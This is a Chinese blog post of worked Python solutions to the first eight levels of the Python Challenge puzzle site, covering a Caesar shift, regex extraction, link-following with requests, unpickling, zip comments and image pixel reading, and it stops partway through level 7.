    <url>/2022/01/29/python%20challenge%20%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<p>这是个人的 python challenge 的刷题记录，网址是：<a href="http://www.pythonchallenge.com/">python challenge</a>。更多内容请点击 <strong>阅读全文</strong>，如有错误，欢迎在评论区指出。</p>
<span id="more"></span>
<h1 id="level-0">level 0</h1>
<h2 id="题目信息">题目信息</h2>
<p>题目信息如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220129214059.png" /></p>
<p>提示：修改 url 的值，并且画面中为 <span class="math inline">\(2^{38}\)</span>，当前 url 为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.pythonchallenge.com/pc/def/0.html</span><br></pre></td></tr></table></figure></p>
<h2 id="方法">方法</h2>
<p>代码： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">res = <span class="number">2</span> ** <span class="number">38</span></span><br><span class="line"><span class="built_in">print</span>(res) <span class="comment"># 274877906944</span></span><br></pre></td></tr></table></figure></p>
<p>将 url 中的 0 用 274877906944 代替即可。</p>
<h1 id="level-1">level 1</h1>
<h2 id="题目信息-1">题目信息</h2>
<p>题目信息如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220129215240.png" /></p>
<p>根据图片应该是某种加密方法，图中的 <code>K-&gt;M, O-&gt;Q, E-&gt;G</code>，正好符合规律：<strong>K往后两个字母就是M，O往后两个字母就是Q，E往后两个字母就是G</strong>。猜测只要把下面粉色的字母全部用自己的后两个字母代替即可。</p>
<h2 id="方法-1">方法 1</h2>
<p>代码： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">encypt_str = <span class="string">&quot;g fmnc wms bgblr rpylqjyrc gr zw fylb. rfyrq ufyr amknsrcpq ypc dmp. bmgle gr gl zw fylb gq glcddgagclr ylb rfyr&#x27;q ufw rfgq rcvr gq qm jmle. sqgle qrpgle.kyicrpylq() gq pcamkkclbcb. lmu ynnjw ml rfc spj. &quot;</span> <span class="comment"># 原来的字符串  </span></span><br><span class="line">  </span><br><span class="line">shift = <span class="number">2</span> <span class="comment"># 后移步数  </span></span><br><span class="line">new_str = <span class="string">&quot;&quot;</span> <span class="comment"># 新的字符串  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> encypt_str:  </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>.isalpha(ch): <span class="comment"># 判断是否是字母  </span></span><br><span class="line">        ch = <span class="built_in">ord</span>(ch)</span><br><span class="line">        ch = ((ch + shift) - <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span> <span class="comment">#  y 和 z 变成 a 和 b</span></span><br><span class="line">        ch = <span class="built_in">chr</span>(ch)  </span><br><span class="line">    new_str += ch  </span><br><span class="line"><span class="built_in">print</span>(new_str)</span><br></pre></td></tr></table></figure> （需要注意的是 y 和 z 变成 a 和 b 的时候！！！）</p>
<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i hope you didnt translate it by hand. thats what computers are for. doing it in by hand is inefficient and that&#x27;s why this text is so long. using string.maketrans() is recommended. now apply on the url.</span><br></pre></td></tr></table></figure></p>
<p>发现除了提示我们可以使用 maketrans() 方法之外，没有其他信息。我们回到 url <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.pythonchallenge.com/pc/def/map.html</span><br></pre></td></tr></table></figure></p>
<p>根据本题的加密方法，将 <code>map -&gt; ocr</code> 即可跳转下一关。 （其实，连代码都没必要写！！！）</p>
<h2 id="方法-2">方法 2</h2>
<h3 id="maketrans-方法介绍">maketrans() 方法介绍</h3>
<blockquote>
<p>Python maketrans() 方法用于创建字符映射的转换表，对于接受两个参数的最简单的调用方式，第一个参数是字符串，表示需要转换的字符，第二个参数也是字符串表示转换的目标。 <strong>注：</strong>两个字符串的长度必须相同，为一一对应的关系。python 3 和 python 2 的使用方法不同，2 需要导入 string，而 3 不需要。</p>
</blockquote>
<ul>
<li><p>语法： <code>str.maketrans(intab, outtab)</code></p></li>
<li><p>参数：</p>
<ul>
<li>intab：字符串中要替代的字符组成的字符串。</li>
<li>outab：与 intab 一一对应的映射字符的字符串。</li>
</ul></li>
<li><p>返回值： 返回字符串转换后生成的新字符串。</p></li>
<li><p>一般配合 translate() 使用</p></li>
</ul>
<h3 id="translate-方法介绍">translate() 方法介绍</h3>
<blockquote>
<p>Python translate() 方法根据参数table给出的表(包含 256 个字符)转换字符串的字符, 要过滤掉的字符放到 del 参数中。</p>
</blockquote>
<ul>
<li><p>语法： <code>str.translate(table[, deletechars]);</code></p></li>
<li><p>参数：</p>
<ul>
<li>table：翻译表，翻译表是通过maketrans方法转换而来。</li>
<li>deletechars：字符串中要过滤的字符列表。</li>
</ul></li>
<li><p>返回值： 返回翻译后的字符串。</p></li>
<li><p>本题演示： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">encypt_str = <span class="string">&quot;g fmnc wms bgblr rpylqjyrc gr zw fylb. rfyrq ufyr amknsrcpq ypc dmp. bmgle gr gl zw fylb gq glcddgagclr ylb rfyr&#x27;q ufw rfgq rcvr gq qm jmle. sqgle qrpgle.kyicrpylq() gq pcamkkclbcb. lmu ynnjw ml rfc spj. &quot;</span></span><br><span class="line"></span><br><span class="line">intab = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>  </span><br><span class="line">outtab = <span class="string">&quot;cdefghijklmnopqrstuvwxyzab&quot;</span>  </span><br><span class="line">trantab = encypt_str.maketrans(intab, outtab)  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(encypt_str.translate(trantab))</span><br></pre></td></tr></table></figure></p></li>
</ul>
<h2 id="方法-3">方法 3</h2>
<h3 id="zip-方法介绍">zip() 方法介绍</h3>
<blockquote>
<p><strong>zip()</strong> 函数用于将可迭代的对象作为参数，将对象中 <strong>对应的元素</strong> 打包成一个个元组，然后返回由这些元组组成的对象，这样做的好处是节约了不少的内存。 我们可以使用 list() 转换来输出列表。也可以用 dict() 转换为字典，此时就产生了映射关系。 如果各个迭代器的元素个数不一致，则返回列表长度与最短的对象相同，利用 * 号操作符，可以将元组解压为列表。</p>
</blockquote>
<ul>
<li><p>语法： <code>zip([iterable, ...])</code></p></li>
<li><p>参数：</p>
<ul>
<li>iterabl：一个或多个迭代器</li>
</ul></li>
<li><p>返回值： 返回一个对象。</p></li>
<li><p>解压： <code>zip(*被压缩的对象)</code>，返回二维矩阵式</p></li>
<li><p>本题演示： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">encypt_str = <span class="string">&quot;g fmnc wms bgblr rpylqjyrc gr zw fylb. rfyrq ufyr amknsrcpq ypc dmp. bmgle gr gl zw fylb gq glcddgagclr ylb rfyr&#x27;q ufw rfgq rcvr gq qm jmle. sqgle qrpgle.kyicrpylq() gq pcamkkclbcb. lmu ynnjw ml rfc spj. &quot;</span> <span class="comment"># 原来的字符串</span></span><br><span class="line"></span><br><span class="line">intab = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz,. &#x27;()&quot;</span>  </span><br><span class="line">outtab = <span class="string">&quot;cdefghijklmnopqrstuvwxyzab,. &#x27;()&quot;</span>  </span><br><span class="line">transtab = <span class="built_in">dict</span>(<span class="built_in">zip</span>(intab, outtab))  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(transtab[x] <span class="keyword">for</span> x <span class="keyword">in</span> encypt_str))</span><br></pre></td></tr></table></figure></p></li>
</ul>
<h1 id="level-2">level 2</h1>
<h2 id="题目信息-2">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130103607.png" /></p>
<p>注意红色字符串，要我们从图片中的书里或者页面源码中找字符。首先，书里根本看不清，所以只能从页面源码中找，打开页面源码，往下滑动，发现确实有，但是内容很多，需要写脚本。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130103757.png" /></p>
<h2 id="方法-4">方法</h2>
<p><strong>步骤：</strong></p>
<ol type="1">
<li><p>请求网址，获得页面源码</p></li>
<li><p>拿到这串字符串</p></li>
<li><p>从中找出字母</p></li>
</ol>
<p><strong>代码：</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line"><span class="keyword">import</span> re  </span><br><span class="line">url = <span class="string">&quot;http://www.pythonchallenge.com/pc/def/ocr.html&quot;</span>  </span><br><span class="line">r = requests.get(url)  </span><br><span class="line">tar = re.findall(<span class="string">r&#x27;&lt;!--(.*?)--&gt;&#x27;</span>, r.text, flags=re.S)[<span class="number">1</span>]  <span class="comment"># 找到一大串字符串</span></span><br><span class="line">ch_lst = re.findall(<span class="string">r&#x27;[a-zA-Z0-9]+&#x27;</span>, tar)  <span class="comment"># 拿到字符串中的字符</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(ch <span class="keyword">for</span> ch <span class="keyword">in</span> ch_lst)) <span class="comment"># 拼接成 url</span></span><br></pre></td></tr></table></figure></p>
<p><strong>结果：</strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">equality</span><br></pre></td></tr></table></figure></p>
<p>修改 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/def/ocr.html</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/def/equality.html</span><br></pre></td></tr></table></figure></p>
<h1 id="level-3">level 3</h1>
<h2 id="题目信息-3">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130142422.png" /></p>
<p>除了一句提示，什么都没有。查看页面源码，发现字符串： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130142748.png" /></p>
<p>根据提示做出合理猜测：<strong>找出这一字符串中的小写字母，每个小写字母的前后都是三个大写字母！！！也就是 AAAbCCC 类型的</strong></p>
<h2 id="方法-5">方法</h2>
<p><strong>步骤：</strong></p>
<ol type="1">
<li>请求网址，拿到页面源码</li>
<li>取出这一大串字符串</li>
<li>从中找出符合条件的小写字母</li>
</ol>
<p><strong>代码：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re  </span><br><span class="line">url = <span class="string">&#x27;http://www.pythonchallenge.com/pc/def/equality.html&#x27;</span>  </span><br><span class="line">r = requests.get(url)  </span><br><span class="line">tar = re.findall(<span class="string">r&#x27;&lt;!--(.*?)--&gt;&#x27;</span>, r.text, flags = re.S)[-<span class="number">1</span>] <span class="comment"># 取出目标字符串  </span></span><br><span class="line">ch_lst = re.findall(<span class="string">r&#x27;[^A-Z]+[A-Z]&#123;3&#125;([a-z])[A-Z]&#123;3&#125;[^A-Z]+&#x27;</span>, tar, re.S)    <span class="comment"># 从目标字符串中取出符合条件的小写字母  </span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(ch <span class="keyword">for</span> ch <span class="keyword">in</span> ch_lst)) <span class="comment"># 拼接成 url</span></span><br></pre></td></tr></table></figure>
<p><strong>解释：</strong> 主要说明一下取出符合条件的小写字母的模式是如何而来的。</p>
<p><code>[a-z]</code> 表示一个小写字母；</p>
<p><code>[A-Z]</code> 表示一个大写字母；</p>
<p><code>[A-Z]&#123;3&#125;</code> 表示三个大写字母；</p>
<p><code>[A-Z]&#123;3&#125;[a-z][A-Z]&#123;3&#125;</code> 表示 ...AAAbCCC... 类型的，注意 ... 可能为大写，比如说：AAAAbCCC 也是会被匹配到的，但是，题目要求的小写字母是前后严格只有三个大写字母，所以还需要补上 <code>[^A-Z]</code> ，这表示非大写字母</p>
<p>总的模式就是：<code>[^A-Z]+[A-Z]&#123;3&#125;([a-z])[A-Z]&#123;3&#125;[^A-Z]+</code>，这个 <code>+</code> 写不写无所谓，就本题而言，主要是 <code>aAAAbCCCc</code> 的都行，无所谓前后是大写还是小写。</p>
<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">linkedlist</span><br></pre></td></tr></table></figure></p>
<p>修改 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/def/equality.html</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/def/linkedlist.html</span><br></pre></td></tr></table></figure></p>
<p>访问修改后的 url 得到提示 <code>linkedlist.php</code> ，访问<code>http://www.pythonchallenge.com/pc/def/linkedlist.php</code> 即可。</p>
<h1 id="level-4">level 4</h1>
<h2 id="题目信息-4">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130194001.png" /></p>
<p>页面源码： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130194018.png" /></p>
<p>点击图片发现可以跳转： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130194032.png" /></p>
<p>注意 url 中的 nothing，应该是通过不停的获得 nothing 然后跳转到下一个页面，最后某个页面会出来答案。手动几次后发现确实如此： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130194143.png" /></p>
<p><strong>注意：本题深坑</strong></p>
<h2 id="方法-6">方法</h2>
<p><strong>代码：</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re  </span><br><span class="line">nothing = <span class="number">12345</span>  </span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;http://www.pythonchallenge.com/pc/def/linkedlist.php?nothing=%d&#x27;</span>  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>):  </span><br><span class="line">    url = <span class="built_in">str</span> % nothing  </span><br><span class="line">    r = requests.get(url)  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        nothing = <span class="built_in">int</span>(re.findall(<span class="string">r&#x27;\d+&#x27;</span>, r.text)[-<span class="number">1</span>])  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;nothing: %d&quot;</span> % nothing)  </span><br><span class="line">    <span class="keyword">except</span>:  </span><br><span class="line">        nothing /= <span class="number">2</span>  </span><br><span class="line">	<span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure></p>
<p><strong>解释：</strong> 首先例举一下这题我遇到的坑！</p>
<p>原先我的代码是这样的： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re  </span><br><span class="line">nothing = <span class="number">12345</span>  </span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;http://www.pythonchallenge.com/pc/def/linkedlist.php?nothing=%d&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>):  </span><br><span class="line">    url = <span class="built_in">str</span> % nothing</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line">    nothing = <span class="built_in">int</span>(re.search(<span class="string">r&#x27;\d+&#x27;</span>, r.text).group())</span><br></pre></td></tr></table></figure></p>
<p>运行一段时间后，得到如下报错： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AttributeError: &#x27;NoneType&#x27; object has no attribute &#x27;group&#x27;</span><br></pre></td></tr></table></figure></p>
<p>并且此时页面的内容为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Yes. Divide by two and keep going.</span><br></pre></td></tr></table></figure></p>
<p>因为此时页面并没有数字，无法匹配，也就没有返回匹配对象，更加没有 group() 方法，所以报错。因此，我将代码修改为如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re  </span><br><span class="line">nothing = <span class="number">12345</span>  </span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;http://www.pythonchallenge.com/pc/def/linkedlist.php?nothing=%d&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>):  </span><br><span class="line">    url = <span class="built_in">str</span> % nothing  </span><br><span class="line">    r = requests.get(url)  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        nothing = <span class="built_in">int</span>(re.search(<span class="string">r&#x27;\d+&#x27;</span>, r.text).group())  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;nothing: %d&quot;</span> % nothing)  </span><br><span class="line">    <span class="keyword">except</span>:  </span><br><span class="line">        nothing /= <span class="number">2</span></span><br><span class="line">		<span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure></p>
<p>然后能够越过这个坑： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130195351.png" /></p>
<p>跳进下一个坑： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130195449.png" /></p>
<p>当 nothing = 82683 时，页面内容如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You&#x27;ve been misleaded to here. Go to previous one and check.</span><br></pre></td></tr></table></figure></p>
<p>前一个是 82682，页面内容如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">There maybe misleading numbers in the text. One example is 82683. Look only for the next nothing and the next nothing is 63579</span><br></pre></td></tr></table></figure></p>
<p>因为 re.search() 匹配到第一个就会返回，所以才会踩到这个坑，这里的 nothing 是第二个，所以修改为最终代码，就是刚刚给的，最后顺利得到结果： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130200232.png" /></p>
<p>这里其实存在着另一个坑，得到 peak.html 的 nothing = 66831，此时如果你没有显示每一页的内容 <code>print(r.text)</code>，极容易错过信息，因为此时 nothing /= 2，也能访问，看后面能够继续就知道了。</p>
<p>修改 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/def/linkedlist.php</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/def/peak.html</span><br></pre></td></tr></table></figure></p>
<p><strong>注意：</strong> 遇到坑之后的 nothing 不要从头开始，这样会省时间。</p>
<h1 id="level-5">level 5</h1>
<h2 id="题目信息-5">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130205619.png" /></p>
<p>页面源码： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130205643.png" /></p>
<p>注意绿字提醒：python 中有一个库叫做 pickle，用来序列化和非序列化的。因此，本题需要使用到该库。还有 <code>banner.p</code> 点进去发现是看不懂的一堆字符串，做一个合理的猜测：<strong><code>banner.p</code> 中的字符串是经过序列化的，将它反序列应该会得到答案</strong></p>
<h2 id="方法-7">方法</h2>
<p><strong>代码：</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, pickle  </span><br><span class="line">url = <span class="string">&#x27;http://www.pythonchallenge.com/pc/def/banner.p&#x27;</span>  </span><br><span class="line">raw = requests.get(url).content  </span><br><span class="line"><span class="built_in">print</span>(pickle.loads(raw))</span><br></pre></td></tr></table></figure></p>
<p>发现得到看不懂的一堆东西： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130210254.png" /></p>
<p>仔细观察发现，是一个二元列表，每一行都是由一个或多个元组组成的，猜测（看完答案后）：<strong>每一行其实都是字符串的压缩：将一行字符串压缩成 <code>[(字符1，出现次数), (字符2，出现次数)...]</code> 因此，只要将每一行还原成原来的样子即可。</strong></p>
<p><strong>最终代码：</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, pickle  </span><br><span class="line">url = <span class="string">&#x27;http://www.pythonchallenge.com/pc/def/banner.p&#x27;</span>  </span><br><span class="line">raw = requests.get(url).content  <span class="comment"># 转为 byte，因为 loads() 的参数是 byte 类型的</span></span><br><span class="line">data = pickle.loads(raw)  </span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> data:  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([ch * num <span class="keyword">for</span> ch, num <span class="keyword">in</span> line]))</span><br></pre></td></tr></table></figure></p>
<p><strong>结果：</strong> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130210708.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">channel</span><br></pre></td></tr></table></figure>
<p>修改 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/def/peak.html</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/def/channel.html</span><br></pre></td></tr></table></figure></p>
<h1 id="level-6">level 6</h1>
<h2 id="题目信息-6">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220131103728.png" /></p>
<p>查看页面源码： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220131103745.png" /></p>
<p>注意：html 旁边的 <code>&lt;!-- &lt;-- zip --&gt;</code>。尝试将 html 修改为 zip 发现可以下载一个压缩文件。</p>
<p>压缩文包里有许多文件，先看 <code>readme.txt</code>： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">welcome to my zipped list.  </span><br><span class="line">  </span><br><span class="line">hint1: start from 90052  </span><br><span class="line">hint2: answer is inside the zip</span><br></pre></td></tr></table></figure></p>
<p>查看之后猜测，除 <code>readme.txt</code> 之外每一个文件内容都是： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Next nothing is (\d+)</span><br></pre></td></tr></table></figure></p>
<p>思路：<strong>nothing 从 90052 开始，先访问对应文件，然后读取下一个 nothing 继续访问。直到出现不同</strong></p>
<h2 id="方法-8">方法</h2>
<p>第一次代码： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re  </span><br><span class="line">rpath = <span class="string">&quot;attachments/level_6/%s.txt&quot;</span>  </span><br><span class="line">nothing = <span class="string">&quot;90052&quot;</span>  </span><br><span class="line">pattern = <span class="string">&quot;Next nothing is (\d+)&quot;</span>  </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">    path = rpath % nothing  </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">        content = f.read()  </span><br><span class="line">        <span class="built_in">print</span>(content)  </span><br><span class="line">        match = re.search(pattern, content)  </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> match:  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">	nothing = match.group(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p>
<p>解释： <code>match.group(1)</code>：因为代码中的 pattern 里面只有一个括号（在我们需要处加上括号），这样子匹配下来的其实是一整句话 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Next nothing is (\d+)</span><br></pre></td></tr></table></figure></p>
<p>但是，我们只需要 () ，如果直接使用 <code>match.group()</code> 就会将整句话给 nothing，而 <code>group(1)</code> 就是只读取第一个括号中的内容，也就是 () 即 nothing。</p>
<p>不出所料，果然没这么简单，当 nothing = 46145 时： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220131105144.png" /></p>
<p>现在的问题是什么是 comments？经过百度后发现 zip 文件有 comment，用来写额外的描述数据。python 中有 zipfile 库可以获得 comment。</p>
<p>最终代码： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re, zipfile  </span><br><span class="line">path = <span class="string">&quot;attachments/level_6/channel.zip&quot;</span>  </span><br><span class="line">nothing = <span class="string">&quot;90052&quot;</span>  </span><br><span class="line">comment = []  </span><br><span class="line">pattern = <span class="string">&quot;Next nothing is (\d+)&quot;</span>  </span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">        fileName = nothing + <span class="string">&#x27;.txt&#x27;</span></span><br><span class="line">        content = f.read(fileName).decode(<span class="string">&quot;utf-8&quot;</span>)  </span><br><span class="line">        comment.append(f.getinfo(fileName).comment.decode(<span class="string">&#x27;utf-8&#x27;</span>))  </span><br><span class="line">        match = re.search(pattern, content)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> match:  </span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        nothing = match.group(<span class="number">1</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(comment))</span><br></pre></td></tr></table></figure></p>
<p>结果： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220131110030.png" /></p>
<p>访问 <code>http://www.pythonchallenge.com/pc/def/hockey.html</code>，得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">it&#x27;s in the air. look at the letters.</span><br></pre></td></tr></table></figure></p>
<p>注意到，组成 HOCKY 的字母为 oxygen，因此修改 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/def/hockey.html</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/def/oxygen.html</span><br></pre></td></tr></table></figure></p>
<h1 id="level-7">level 7</h1>
<h2 id="题目信息-7">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201114933.png" /></p>
<p>只有上面一张奇怪的图片，页面源码也没有东西。可以看到图片上有一些灰度块，目前合理猜测就是：<strong>这些灰度块隐藏着信息。</strong></p>
<h2 id="方法-9">方法</h2>
<p>第一步，先将图片下载下来： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">img_url = <span class="string">&quot;http://www.pythonchallenge.com/pc/def/oxygen.png&quot;</span>  </span><br><span class="line">path = <span class="string">&quot;attachments/level_7/oxygen.png&quot;</span></span><br><span class="line">img = requests.get(img_url)  </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    f.write(img.content)</span><br></pre></td></tr></table></figure></p>
<p>第二步，查看图片的必要信息： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">path = <span class="string">&quot;attachments/level_7/oxygen.png&quot;</span></span><br><span class="line">img = Image.<span class="built_in">open</span>(path)  </span><br><span class="line"><span class="built_in">print</span>(img.<span class="built_in">format</span>, img.size, img.mode)</span><br></pre></td></tr></table></figure></p>
<p>结果是： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PNG (629, 95) RGBA # 分别是后缀，（宽，高）， 模式</span><br></pre></td></tr></table></figure></p>
<p>可以看到图像的模式是 RGBA 的，那么每个像素点就是个四元组，分别为 <code>r, g, b, a</code> 前三个为红，绿，黄，最后一个为透明度（本题用不着）。需要注意一点：<strong>灰度图像的 r == g == b</strong>，因此，我们利用这点，先找到图片中的灰度条在哪几行。代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">path = <span class="string">&quot;attachments/level_7/oxygen.png&quot;</span></span><br><span class="line">img = Image.<span class="built_in">open</span>(path)</span><br><span class="line">row = [img.getpixel((<span class="number">0</span>, x)) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(img.height)]  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(img.height):  </span><br><span class="line">    <span class="keyword">if</span> row[i][<span class="number">0</span>] == row[i][<span class="number">1</span>] == row[i][<span class="number">2</span>]:  <span class="comment"># r == g == b</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%d:&quot;</span> % i, end = <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(row[i])</span><br></pre></td></tr></table></figure></p>
<p>结果： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201122229.png" /></p>
<p>随便取一行即可，这里取 47，因为 <code>img.height / 2</code> 的值为 47。</p>
<p>第三步，取出 47 行的所有像素点： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">path = <span class="string">&quot;attachments/level_7/oxygen.png&quot;</span></span><br><span class="line">img = Image.<span class="built_in">open</span>(path)</span><br><span class="line">row = [img.getpixel((x, img.height/<span class="number">2</span>)) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(img.width)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(img.width):</span><br><span class="line">    <span class="built_in">print</span>(row[i])</span><br></pre></td></tr></table></figure></p>
<p>结果： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201122525.png" /></p>
